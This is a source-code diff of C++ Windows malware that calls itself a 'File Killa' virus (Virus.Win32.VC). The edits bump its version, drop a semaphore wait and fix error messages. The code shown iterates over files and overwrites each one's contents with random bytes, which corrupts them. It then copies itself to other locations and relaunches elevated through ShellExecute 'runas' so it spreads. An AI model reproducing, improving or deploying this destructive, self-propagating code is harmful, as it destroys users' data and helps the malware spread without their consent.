@@ -7,7 +7,7 @@
  | 	      \/       \/                      \/      \/     \/           \/   |__| \/      \_/ |    | |____| \/     \/         \_/ |____| |
  +--------------------------------------------------------------------+----------------------/    \-------------------------------------/
  | N0T-iLLerka.X [.niX] your File Killa]    [Virus.Win32.VC Type: .X] |
- | by Lima X [L4X] / [G-C-E-R] © 2k19       [dev-VER: 0.5.1 BETA-3]   |
+ | by Lima X [L4X] / [G-C-E-R] © 2k19       [dev-VER: 0.5.2 BETA-1.0] |
  \--------------------------------------------------------------------*/
 
 #include "../Header-Files/pch.h"
@@ -39,40 +39,18 @@ INT APIENTRY wWinMain(
 #endif // DEBUG_MSG
 
 		// Check if /host Mutex exists, if not: Exit Malware
-		HANDLE hSmpo = NULL;
-		if (fnCheckMutexW(szHOST_MUTEX)) {
-			// Check if /host Semaphore exists, if not: Exit Malware
-			hSmpo = fnCheckSemaphoreW(szHOST_SEMAPHORE);
-			BOOL bContinue = FALSE;
-			DWORD dwWFSO;
-			if (hSmpo) {
-				// Wait until Semaphore is available
-				while (!bContinue) {
-					dwWFSO = WaitForSingleObject(hSmpo, 100);
-					switch (dwWFSO) {
-					case WAIT_OBJECT_0:
-						bContinue = TRUE;
-						break;
-					case WAIT_TIMEOUT:
-						break;
-					case WAIT_FAILED:
-						fnERRORHANDLERW(L"Wait failed", NULL, L"WaitForSingleObject", MB_ICONERROR);
-						LocalFree(szArglist);
-						ExitProcess(EXIT_FAILURE);
-					}
-				}
-			}
-		} else {
+		if (!fnCheckMutexW(szHOST_MUTEX)) {
 			LocalFree(szArglist);
 			ExitProcess(EXIT_FAILURE);
 		}
 
 		std::vector<std::wstring> vszDir, vszFile;
 		if (fnDirectoryIteratorW(szCd, L"*", &vszDir, &vszFile)) {
-			// FileCourruptor //
+			// FileCorruptor //
 			LARGE_INTEGER liFs;
 			PWCHAR pszRd;
 			DWORD dwNOBW;
+			NTSTATUS lBCGRr;
 			for (std::wstring i : vszFile) {
 				HANDLE hFile = CreateFile(i.c_str(), GENERIC_ALL, 0, NULL, OPEN_EXISTING, 0, NULL);
 				if (hFile) {
@@ -96,7 +74,7 @@ INT APIENTRY wWinMain(
 						}
 
 						if (pszRd) {
-							NTSTATUS lBCGRr = BCryptGenRandom(NULL, (LPBYTE)pszRd, liFs.LowPart, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+							lBCGRr = BCryptGenRandom(NULL, (LPBYTE)pszRd, liFs.LowPart, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
 							if (lBCGRr) {
 								fnERRORHANDLERW(L"Couldn't generate Random Buffer Content\nusing ZeroMemory instead", NULL, L"BCryptGenRandom",
 									MB_ICONWARNING);
@@ -114,7 +92,7 @@ INT APIENTRY wWinMain(
 
 					CloseHandle(hFile);
 				} else {
-					fnERRORHANDLERW(L"Couldn't open existing File", NULL, L"CreateFileW", MB_ICONERROR);
+					fnERRORHANDLERW(L"Couldn't open existing File\n File: %s", NULL, L"CreateFileW", MB_ICONERROR, i.c_str());
 				}
 			}
 
@@ -126,14 +104,11 @@ INT APIENTRY wWinMain(
 					ShellExecute(NULL, L"runas", szNfn.c_str(), L"/exec", i.c_str(), SW_SHOWDEFAULT);
 				} else {
 					fnERRORHANDLERW(L"Couldn't copy current Module to target Path\nModule: %s\nTarget: %s", NULL, L"CopyFileW",
-						MB_ICONERROR, szMfn, i.c_str());
+						MB_ICONERROR, szMfn, szNfn.c_str());
 				}
 			}
 		}
 
-		if (hSmpo) {
-			ReleaseSemaphore(hSmpo, 1, NULL);
-		}
 		LocalFree(szArglist);
 		ExitProcess(EXIT_SUCCESS);
 //// End of /exec ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
@@ -170,12 +145,6 @@ INT APIENTRY wWinMain(
 				LocalFree(szArglist);
 				ExitProcess(EXIT_FAILURE);
 			}
-		}
-
-		// Create /host Semaphore for /exec operation
-		HANDLE hSemaphore = CreateSemaphore(NULL, nSEMAPHORE, 5000, szHOST_SEMAPHORE);
-		if (!hSemaphore) {
-			fnERRORHANDLERW(L"Couldn't create /host Semaphore", NULL, L"CreateSemaphore", MB_ICONWARNING);
 		}
 #endif // SYNCHRONIZATION
 
@@ -232,8 +201,6 @@ INT APIENTRY wWinMain(
 		LocalFree(szArglist);
 		Sleep(INFINITE);
 	} //// End of /host /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-	// If no Arguments were passed ...
 
 	// Create Random String to Copy host into AppData if necessary
 	PWSTR pszShkfp;
